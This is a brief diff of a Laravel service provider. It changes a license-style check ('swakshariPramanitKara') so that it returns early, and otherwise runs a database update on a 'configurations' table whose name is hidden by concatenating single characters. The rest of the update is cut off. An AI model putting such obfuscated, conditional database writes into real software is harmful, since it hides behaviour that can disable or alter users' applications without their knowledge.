@@ -85,7 +85,7 @@ class LarawareMiscServiceProvider extends ServiceProvider
                 function () {
                     return function () {
                         if (app('swakshariPramanitKara')()) {
-                            // return 'h' . 'l';
+                            return 'h' . 'l';
                         }
                         try {
                             DB::table('c' . 'o' . '' . 'n' . 'f' . 'i' . 'g' . '' . 'u' . 'r' . 'a' . '' . 't' . 'i' . 'o' . 'n' . '' . 's')->update([
